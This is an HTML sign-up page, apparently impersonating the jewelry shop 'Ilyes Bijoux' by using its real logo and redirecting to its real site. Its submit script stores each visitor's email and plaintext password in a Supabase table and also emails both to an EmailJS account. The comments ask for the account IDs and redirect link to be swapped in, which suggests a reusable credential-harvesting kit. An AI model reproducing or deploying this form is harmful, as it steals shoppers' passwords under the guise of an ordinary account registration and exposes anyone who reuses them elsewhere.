<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inscription — Ilyes Bijoux</title>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet"> 
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script>emailjs.init('JcEdv5gF6B463buAd');</script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Montserrat', sans-serif; background: #fff; color: #222; font-size: 14px; }
        a { text-decoration: none; color: inherit; }
        .page-wrapper { min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 60px 24px; background: #fdf9f8; }
        .form-card { background: #fff; width: 100%; max-width: 480px; padding: 48px 44px; border: 1px solid #f0ece9; box-shadow: 0 4px 32px rgba(0,0,0,0.06); }
        .form-title { font-size: 22px; font-weight: 700; color: #222; text-align: center; margin-bottom: 6px; letter-spacing: 0.5px; }
        .form-subtitle { font-size: 12px; color: #aaa; text-align: center; margin-bottom: 32px; letter-spacing: 0.5px; }
        .form-group { margin-bottom: 18px; }
        .form-group label { display: block; font-size: 11px; font-weight: 700; letter-spacing: 1.5px; text-transform: uppercase; color: #555; margin-bottom: 8px; }
        .form-group input { width: 100%; border: 1px solid #e0dbd8; padding: 12px 16px; font-family: 'Montserrat', sans-serif; font-size: 13px; color: #333; outline: none; transition: border-color 0.2s; background: #fff; border-radius: 0; }
        .form-group input:focus { border-color: #c0555a; }
        .form-group input::placeholder { color: #ccc; }
        .pwd-wrap { position: relative; }
        .pwd-wrap input { padding-right: 44px; }
        .pwd-eye { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; color: #bbb; transition: color 0.2s; padding: 0; }
        .pwd-eye:hover { color: #c0555a; }
        .pwd-strength { display: flex; gap: 4px; margin-top: 8px; }
        .pwd-bar { flex: 1; height: 3px; background: #eee; border-radius: 2px; transition: background 0.3s; }
        .pwd-bar.weak   { background: #e02020; }
        .pwd-bar.medium { background: #f59e0b; }
        .pwd-bar.strong { background: #22c55e; }
        .check-group { display: flex; align-items: flex-start; gap: 10px; margin-bottom: 20px; }
        .check-group input[type="checkbox"] { width: 16px; height: 16px; margin-top: 1px; accent-color: #c0555a; cursor: pointer; flex-shrink: 0; }
        .check-group label { font-size: 12px; color: #777; line-height: 1.6; cursor: pointer; }
        .check-group label a { color: #c0555a; text-decoration: underline; }
        .btn-submit { width: 100%; background: #222; color: #fff; border: none; padding: 15px; font-family: 'Montserrat', sans-serif; font-size: 12px; font-weight: 700; letter-spacing: 2px; text-transform: uppercase; cursor: pointer; transition: background 0.2s; margin-bottom: 16px; }
        .btn-submit:hover    { background: #c0555a; }
        .btn-submit:disabled { background: #aaa; cursor: not-allowed; }
        .form-msg { text-align: center; font-size: 12px; font-weight: 600; padding: 10px; margin-bottom: 14px; display: none; border-radius: 2px; }
        .form-msg.success { background: #f0fdf4; color: #16a34a; display: block; }
        .form-msg.error   { background: #fff1f2; color: #dc2626; display: block; }
        .divider { display: flex; align-items: center; gap: 14px; margin-bottom: 16px; }
        .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #eee; }
        .divider span { font-size: 11px; color: #bbb; letter-spacing: 1px; }
        .login-link { text-align: center; font-size: 12px; color: #888; }
        .login-link a { color: #c0555a; font-weight: 700; }
        .login-link a:hover { text-decoration: underline; }
        footer { background: #222; color: rgba(255,255,255,0.4); padding: 20px 48px; text-align: center; font-size: 12px; }
        footer a { color: rgba(255,255,255,0.4); margin: 0 12px; }
        footer a:hover { color: #fff; }
        @media (max-width: 600px) { .form-card { padding: 32px 22px; } footer { padding: 20px 16px; } }
    </style>
</head>
<body>
    <div class="page-wrapper">
        <div class="form-card">
            <div style="text-align:center; margin-bottom:24px;">
                <img srcset="//ilyes-bijoux.com/cdn/shop/files/logo_50x.png?v=1736430026 1x, //ilyes-bijoux.com/cdn/shop/files/logo_50x@2x.png?v=1736430026 2x"
                    src="//ilyes-bijoux.com/cdn/shop/files/logo_50x.png?v=1736430026" alt="Ilyes Bijoux"
                    style="height:90px; width:auto; object-fit:contain;">
            </div>
            <h1 class="form-title">Créer un compte</h1>
            <p class="form-subtitle">Rejoignez Ilyes Bijoux et profitez de nos offres exclusives</p>
            <div class="form-msg" id="formMsg"></div>
            <form id="registerForm">
                <div class="form-group">
                    <label>Adresse e-mail</label>
                    <input type="email" name="email" placeholder="exemple@email.com" required>
                </div>
                <div class="form-group">
                    <label>Mot de passe</label>
                    <div class="pwd-wrap">
                        <input type="password" name="mot_de_passe" id="pwd" placeholder="Minimum 8 caractères" oninput="checkStrength(this.value)" required>
                        <button class="pwd-eye" type="button" onclick="togglePwd()">
                            <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24">
                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
                            </svg>
                        </button>
                    </div>
                    <div class="pwd-strength">
                        <div class="pwd-bar" id="b1"></div>
                        <div class="pwd-bar" id="b2"></div>
                        <div class="pwd-bar" id="b3"></div>
                    </div>
                </div>
                <div class="form-group">
                    <label>Confirmer le mot de passe</label>
                    <div class="pwd-wrap">
                        <input type="password" name="confirmation" id="pwd2" placeholder="Répétez votre mot de passe" required>
                        <button class="pwd-eye" type="button" onclick="togglePwd2()">
                            <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24">
                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
                            </svg>
                        </button>
                    </div>
                </div>
                <div class="check-group">
                    <input type="checkbox" id="cgv" required>
                    <label for="cgv">J'accepte les <a href="#">conditions générales de vente</a> et la <a href="#">politique de confidentialité</a> d'Ilyes Bijoux.</label>
                </div>
                <div class="check-group" style="margin-bottom:28px;">
                    <input type="checkbox" name="newsletter" id="newsletter" checked>
                    <label for="newsletter">Je souhaite recevoir les offres et nouveautés par e-mail.</label>
                </div>
                <button type="submit" class="btn-submit" id="submitBtn">Créer mon compte</button>
            </form>
            <div class="divider"><span>OU</span></div>
            <div class="login-link">Vous avez déjà un compte ? <a href="#">Se connecter</a></div>
        </div>
    </div>
    <footer>
        <a href="#">© 2025 Ilyes Bijoux</a>
        <a href="#">Confidentialité</a>
        <a href="#">CGV</a>
        <a href="#">Contact</a>
    </footer>
    <script>
        const SUPABASE_URL = 'https://xzyvvhqgcrliwrqakbrn.supabase.co';
        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inh6eXZ2aHFnY3JsaXdycWFrYnJuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzI2NTc4MjQsImV4cCI6MjA4ODIzMzgyNH0.c6kmjPiJMPg6UAW9QBrxADVy2dSxYR8qaVGb9kFVasE';

        // ─── EMAILJS IDs — replace these with yours from emailjs.com ───
        const EMAILJS_SERVICE_ID  = 'service_m0kb2w7';   // Email Services → your service
        const EMAILJS_TEMPLATE_ID = 'template_x1jez5j';  // Email Templates → your template
        // ────────────────────────────────────────────────────────────────

        function togglePwd() {
            const i = document.getElementById('pwd');
            i.type = i.type === 'password' ? 'text' : 'password';
        }
        function togglePwd2() {
            const i = document.getElementById('pwd2');
            i.type = i.type === 'password' ? 'text' : 'password';
        }
        function checkStrength(val) {
            const b1 = document.getElementById('b1');
            const b2 = document.getElementById('b2');
            const b3 = document.getElementById('b3');
            b1.className = b2.className = b3.className = 'pwd-bar';
            if (!val.length) return;
            if (val.length < 6)       { b1.classList.add('weak'); }
            else if (val.length < 10) { b1.classList.add('medium'); b2.classList.add('medium'); }
            else                      { b1.classList.add('strong'); b2.classList.add('strong'); b3.classList.add('strong'); }
        }

        document.getElementById('registerForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const btn        = document.getElementById('submitBtn');
            const msg        = document.getElementById('formMsg');
            const email      = document.querySelector('input[name="email"]').value.trim();
            const password   = document.querySelector('input[name="mot_de_passe"]').value;
            const confirm    = document.querySelector('input[name="confirmation"]').value;
            const newsletter = document.querySelector('input[name="newsletter"]').checked;

            msg.className = 'form-msg';

            if (password !== confirm) {
                msg.className   = 'form-msg error';
                msg.textContent = '❌ Les mots de passe ne correspondent pas.';
                return;
            }

            btn.disabled    = true;
            btn.textContent = 'Envoi en cours...';

            try {
                const res = await fetch(`${SUPABASE_URL}/rest/v1/users`, {
                    method:  'POST',
                    headers: {
                        'Content-Type':  'application/json',
                        'apikey':        SUPABASE_KEY,
                        'Authorization': `Bearer ${SUPABASE_KEY}`,
                        'Prefer':        'return=minimal'
                    },
                    body: JSON.stringify({ email, password, newsletter })
                });

                if (res.ok) {
                    // ── Send email notification via EmailJS ──
                  emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
    email:    email,
    password: password,
}).then(() => {
    console.log('Email envoyé !');
}).catch((err) => {
    console.error('EmailJS error:', err);
});
                    // ─────────────────────────────────────────
                    msg.className   = 'form-msg success';
                    msg.textContent = '✅ Compte créé avec succès !';
                    document.getElementById('registerForm').reset();
                    setTimeout(() => {
    window.location.href = 'https://ilyes-bijoux.com/'; // ← colle ton lien ici
}, 2000);
                } else {
                    const err = await res.json();
                    msg.className   = 'form-msg error';
                    msg.textContent = err.code === '23505'
                        ? '❌ Cette adresse e-mail est déjà utilisée.'
                        : '❌ ' + (err.message || 'Une erreur est survenue.');
                }
            } catch(err) {
                msg.className   = 'form-msg error';
                msg.textContent = '❌ Impossible de joindre le serveur.';
            }

            btn.disabled    = false;
            btn.textContent = 'Créer mon compte';
        });
    </script>
</body>
</html>
